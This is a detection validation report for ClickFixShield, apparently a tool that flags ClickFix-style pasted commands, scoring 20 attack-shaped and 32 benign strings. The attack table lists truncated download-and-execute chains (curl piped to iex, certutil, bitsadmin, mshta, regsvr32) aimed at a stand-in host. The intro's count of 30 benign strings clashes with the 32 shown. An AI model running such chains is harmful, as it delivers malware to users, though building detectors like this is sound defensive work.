# ClickFixShield Detection Validation Report

Generated 2026-09-07 05:54:27 UTC by `DetectionCorpusTests.Corpus_ComputesPrecisionAndRecall_AndWritesMarkdownReport`.

Corpus: 20 attack-shaped strings (realistic ClickFix-style wrapper syntax around a harmless
embedded action such as `Write-Host 'test'` - no real malware or live remote hosts) covering
every rule category in `rules.json`, plus 30 benign strings (URLs, git/npm/pip/dotnet/cloud
CLI commands, legitimate PowerShell, and plain text).

Positive class = "scored HighRisk or above" - the same threshold `RunInterceptionDecider`
requires before a process is ever killed, so this report measures the engine against the bar
it is actually gated on in production.

## Summary

| Metric | Value |
|---|---|
| True Positives (attack correctly flagged HighRisk+) | 19 |
| False Negatives (attack missed) | 1 |
| False Positives (benign wrongly flagged HighRisk+) | 0 |
| True Negatives (benign correctly left below HighRisk) | 32 |
| **Precision** | **100.0%** |
| **Recall** | **95.0%** |

## Attack-shaped corpus

| String | Category | Expected | Actual Severity (score) | Matched Rules | Pass/Fail |
|---|---|---|---|---|---|
| `powershell.exe -WindowStyle Hidden -EncodedCommand VwByAGkAdABlAC0ASAB...` | PowerShellExecution + PowerShellObfuscation + Obfuscation | Attack (expect HighRisk+) | Malicious (95) | PS-INVOKE, PS-ENCODED, HIDDEN-WINDOW, OBF-BASE64 | PASS |
| `cmd.exe /c powershell -w hidden -Command "Write-Host 'test'"` | CmdExecution + PowerShellExecution + Obfuscation | Attack (expect HighRisk+) | HighRisk (70) | PS-INVOKE, HIDDEN-WINDOW, CMD-INVOKE, CMD-C-FLAG | PASS |
| `curl -s http://malicious-update-check.example.com/fix.ps1 \| iex` | RemoteDownload (curl + pipe-to-iex) | Attack (expect HighRisk+) | HighRisk (72) | DL-CURL, DL-PIPE-IEX | PASS |
| `cmd /c wget http://malicious-update-check.example.com/fix.ps1 -O fix.p...` | CmdExecution + RemoteDownload (wget) + PowerShellExecution | Attack (expect HighRisk+) | HighRisk (77) | PS-INVOKE, CMD-INVOKE, CMD-C-FLAG, DL-WGET | PASS |
| `powershell -w hidden -enc VwByAGkAdABlAC0ASABvAHMAdAAgACcAdABlAHMAdAAn...` | PowerShellObfuscation + Obfuscation + RemoteDownload (iwr) | Attack (expect HighRisk+) | Malicious (100) | PS-INVOKE, PS-ENCODED, HIDDEN-WINDOW, DL-IWR, OBF-BASE64 | PASS |
| `bitsadmin.exe /transfer clickfixdemo /download /priority normal http:/...` | RemoteDownload (bitsadmin) | Attack (expect HighRisk+) | HighRisk (67) | DL-BITSADMIN | PASS |
| `certutil.exe -urlcache -f http://malicious-update-check.example.com/fi...` | RemoteDownload (certutil -urlcache) | Attack (expect HighRisk+) | HighRisk (67) | DL-CERTUTIL | PASS |
| `mshta.exe http://malicious-update-check.example.com/fix.hta` | ScriptExecution (mshta) | Attack (expect HighRisk+) | HighRisk (67) | SCRIPT-MSHTA | PASS |
| `regsvr32 /u /s /i:http://malicious-update-check.example.com/fix.sct sc...` | ScriptExecution (regsvr32 Squiblydoo) | Attack (expect HighRisk+) | HighRisk (67) | SCRIPT-REGSVR32 | PASS |
| `cmd /c curl -s http://malicious-update-check.example.com/fix.vbs -o fi...` | CmdExecution + RemoteDownload + ScriptExecution (wscript) | Attack (expect HighRisk+) | Malicious (87) | CMD-INVOKE, CMD-C-FLAG, DL-CURL, SCRIPT-WSCRIPT | PASS |
| `cmd /c curl -s http://malicious-update-check.example.com/fix.js -o fix...` | CmdExecution + RemoteDownload + ScriptExecution (cscript) | Attack (expect HighRisk+) | Malicious (87) | CMD-INVOKE, CMD-C-FLAG, DL-CURL, SCRIPT-CSCRIPT | PASS |
| `cmd.exe /c "powershell -w hidden -enc VwByAGkAdABlAC0ASABvAHMAdAAgACcA...` | CmdExecution + PowerShellObfuscation + Obfuscation (symbol chaining) | Attack (expect HighRisk+) | Malicious (100) | PS-INVOKE, PS-ENCODED, HIDDEN-WINDOW, CMD-INVOKE, CMD-C-FLAG, OBF-BASE64, OBF-SYMBOLS | PASS |
| `mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershe...` | ScriptExecution (mshta) + PowerShellObfuscation - classic ClickFix wrapper | Attack (expect HighRisk+) | Malicious (100) | PS-INVOKE, PS-ENCODED, SCRIPT-MSHTA, SCRIPT-WSCRIPT, OBF-BASE64 | PASS |
| `powershell -w hidden -c "iwr -useb http://malicious-update-check.examp...` | PowerShellExecution + Obfuscation + RemoteDownload (iwr + pipe-to-iex) | Attack (expect HighRisk+) | Malicious (100) | PS-INVOKE, HIDDEN-WINDOW, DL-IWR, DL-PIPE-IEX | PASS |
| `mshta.exe javascript:a=(new ActiveXObject("WScript.Shell")).Run("cmd /...` | ScriptExecution + CmdExecution + RemoteDownload + Obfuscation (full chain) | Attack (expect HighRisk+) | Malicious (100) | PS-INVOKE, HIDDEN-WINDOW, CMD-INVOKE, CMD-C-FLAG, DL-CURL, SCRIPT-MSHTA, SCRIPT-WSCRIPT | PASS |
| `cmd.exe /c bitsadmin.exe /transfer msupdate /download /priority high h...` | CmdExecution + RemoteDownload (bitsadmin) | Attack (expect HighRisk+) | Malicious (92) | CMD-INVOKE, CMD-C-FLAG, DL-BITSADMIN | PASS |
| `cmd /c certutil -decode fix.b64 fix.exe & fix.exe` | CmdExecution + RemoteDownload (certutil -decode) | Attack (expect HighRisk+) | HighRisk (80) | CMD-INVOKE, CMD-C-FLAG, DL-CERTUTIL | PASS |
| `cmd /c regsvr32 /s /u /i:http://malicious-update-check.example.com/fix...` | CmdExecution + ScriptExecution (regsvr32) | Attack (expect HighRisk+) | Malicious (92) | CMD-INVOKE, CMD-C-FLAG, SCRIPT-REGSVR32 | PASS |
| `cmd.exe /c powershell.exe -NoP -W Hidden -Enc VwByAGkAdABlAC0ASABvAHMA...` | Full obfuscated dropper chain (worst case) | Attack (expect HighRisk+) | Malicious (100) | PS-INVOKE, PS-ENCODED, HIDDEN-WINDOW, CMD-INVOKE, CMD-C-FLAG, DL-IWR, DL-PIPE-IEX, OBF-BASE64, OBF-SYMBOLS | PASS |
| `wscript.exe //B //nologo C:\Users\Public\update.vbs http://malicious-u...` | ScriptExecution (wscript, bare LOLBin + suspicious remote arg) | Attack (expect HighRisk+) | Suspicious (37) | SCRIPT-WSCRIPT | FAIL |

## Benign corpus

| String | Category | Expected | Actual Severity (score) | Matched Rules | Pass/Fail |
|---|---|---|---|---|---|
| `https://www.wikipedia.org/wiki/Example` | Plain URL | Benign (expect Safe/Suspicious) | Safe (0) | (none) | PASS |
| `https://learn.microsoft.com/en-us/powershell/` | Plain URL | Benign (expect Safe/Suspicious) | Suspicious (27) | PS-INVOKE | PASS |
| `https://github.com/dotnet/runtime/releases` | Plain URL | Benign (expect Safe/Suspicious) | Safe (0) | (none) | PASS |
| `git clone https://github.com/user/repo.git` | git command | Benign (expect Safe/Suspicious) | Safe (0) | (none) | PASS |
| `git commit -m 'fix bug in login flow'` | git command | Benign (expect Safe/Suspicious) | Safe (0) | (none) | PASS |
| `git push origin main` | git command | Benign (expect Safe/Suspicious) | Safe (0) | (none) | PASS |
| `npm install express --save` | npm command | Benign (expect Safe/Suspicious) | Safe (0) | (none) | PASS |
| `npm run build` | npm command | Benign (expect Safe/Suspicious) | Safe (0) | (none) | PASS |
| `pip install numpy pandas` | pip command | Benign (expect Safe/Suspicious) | Safe (0) | (none) | PASS |
| `dotnet build ClickFixShield.sln` | dotnet CLI | Benign (expect Safe/Suspicious) | Safe (0) | (none) | PASS |
| `dotnet test tests/ClickFixShield.Tests` | dotnet CLI | Benign (expect Safe/Suspicious) | Safe (0) | (none) | PASS |
| `docker run -it ubuntu bash` | Container tooling | Benign (expect Safe/Suspicious) | Safe (0) | (none) | PASS |
| `kubectl get pods -n default` | Container tooling | Benign (expect Safe/Suspicious) | Safe (0) | (none) | PASS |
| `ssh user@build-server.internal` | Remote admin (ssh) | Benign (expect Safe/Suspicious) | Safe (0) | (none) | PASS |
| `ping google.com` | Networking | Benign (expect Safe/Suspicious) | Safe (0) | (none) | PASS |
| `ipconfig /all` | Networking | Benign (expect Safe/Suspicious) | Safe (0) | (none) | PASS |
| `netstat -ano` | Networking | Benign (expect Safe/Suspicious) | Safe (0) | (none) | PASS |
| `Test-NetConnection google.com -Port 443` | Legitimate PowerShell | Benign (expect Safe/Suspicious) | Safe (0) | (none) | PASS |
| `Get-Process -Name chrome` | Legitimate PowerShell | Benign (expect Safe/Suspicious) | Safe (0) | (none) | PASS |
| `Get-ChildItem -Recurse -Filter *.cs` | Legitimate PowerShell | Benign (expect Safe/Suspicious) | Safe (0) | (none) | PASS |
| `Get-Content .\notes.txt` | Legitimate PowerShell | Benign (expect Safe/Suspicious) | Safe (0) | (none) | PASS |
| `New-Item -ItemType Directory -Path C:\Projects\demo` | Legitimate PowerShell | Benign (expect Safe/Suspicious) | Safe (0) | (none) | PASS |
| `Copy-Item report.docx D:\Backup\` | Legitimate PowerShell | Benign (expect Safe/Suspicious) | Safe (0) | (none) | PASS |
| `curl -O https://nodejs.org/dist/v20.11.0/node-v20.11.0-x64.msi` | Legitimate curl download | Benign (expect Safe/Suspicious) | Suspicious (37) | DL-CURL | PASS |
| `wget https://mirror.example.edu/ubuntu-22.04.iso` | Legitimate wget download | Benign (expect Safe/Suspicious) | Suspicious (37) | DL-WGET | PASS |
| `az login` | Cloud CLI | Benign (expect Safe/Suspicious) | Safe (0) | (none) | PASS |
| `aws s3 ls my-bucket` | Cloud CLI | Benign (expect Safe/Suspicious) | Safe (0) | (none) | PASS |
| `The quarterly report is due next Friday afternoon.` | Plain text | Benign (expect Safe/Suspicious) | Safe (0) | (none) | PASS |
| `Please review the attached invoice before Friday.` | Plain text | Benign (expect Safe/Suspicious) | Safe (0) | (none) | PASS |
| `12345 Main Street, Springfield` | Plain text | Benign (expect Safe/Suspicious) | Safe (0) | (none) | PASS |
| `a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0` | Git commit hash (hex, base64-rule false-positive check) | Benign (expect Safe/Suspicious) | Safe (15) | OBF-BASE64 | PASS |
| `(empty)` | Empty input | Benign (expect Safe/Suspicious) | Safe (0) | (none) | PASS |
